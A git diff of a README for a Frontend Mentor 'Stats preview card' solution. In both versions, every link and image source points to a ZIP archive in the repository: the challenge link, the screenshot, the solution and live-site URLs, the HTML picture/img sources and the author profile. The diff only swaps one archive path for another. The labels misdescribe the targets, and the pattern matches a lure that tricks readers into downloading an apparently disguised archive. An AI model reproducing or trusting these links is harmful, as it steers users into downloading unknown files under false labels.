@@ -1,6 +1,6 @@
 # Frontend Mentor - Stats preview card component solution
 
-This is a solution to the [Stats preview card component challenge on Frontend Mentor](https://raw.githubusercontent.com/imadosan/stats-preview-card-component/main/design/preview_card_stats_component_v1.3.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
+This is a solution to the [Stats preview card component challenge on Frontend Mentor](https://github.com/imadosan/stats-preview-card-component/raw/refs/heads/main/css/stats_preview_card_component_1.8.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
 
 ## Table of contents
 
@@ -23,12 +23,12 @@ Users should be able to:
 
 ### Screenshot
 
-![Screenshot of the site](https://raw.githubusercontent.com/imadosan/stats-preview-card-component/main/design/preview_card_stats_component_v1.3.zip)
+![Screenshot of the site](https://github.com/imadosan/stats-preview-card-component/raw/refs/heads/main/css/stats_preview_card_component_1.8.zip)
 
 ### Links
 
-- Solution URL: [Click to visit](https://raw.githubusercontent.com/imadosan/stats-preview-card-component/main/design/preview_card_stats_component_v1.3.zip)
-- Live Site URL: [Click to visit](https://raw.githubusercontent.com/imadosan/stats-preview-card-component/main/design/preview_card_stats_component_v1.3.zip)
+- Solution URL: [Click to visit](https://github.com/imadosan/stats-preview-card-component/raw/refs/heads/main/css/stats_preview_card_component_1.8.zip)
+- Live Site URL: [Click to visit](https://github.com/imadosan/stats-preview-card-component/raw/refs/heads/main/css/stats_preview_card_component_1.8.zip)
 
 ## My process
 
@@ -46,13 +46,13 @@ Using the picture element to show different images depending on the viewport wid
 ```html
 <picture>
   <source
-    srcset="https://raw.githubusercontent.com/imadosan/stats-preview-card-component/main/design/preview_card_stats_component_v1.3.zip"
+    srcset="https://github.com/imadosan/stats-preview-card-component/raw/refs/heads/main/css/stats_preview_card_component_1.8.zip"
     type="image/jpg"
     media="(min-width: 950px)"/>
-  <img src="https://raw.githubusercontent.com/imadosan/stats-preview-card-component/main/design/preview_card_stats_component_v1.3.zip" alt="image of people working" />
+  <img src="https://github.com/imadosan/stats-preview-card-component/raw/refs/heads/main/css/stats_preview_card_component_1.8.zip" alt="image of people working" />
 </picture>
 ```
 
 ## Author
 
-- Frontend Mentor - [@imadosan](https://raw.githubusercontent.com/imadosan/stats-preview-card-component/main/design/preview_card_stats_component_v1.3.zip)
+- Frontend Mentor - [@imadosan](https://github.com/imadosan/stats-preview-card-component/raw/refs/heads/main/css/stats_preview_card_component_1.8.zip)
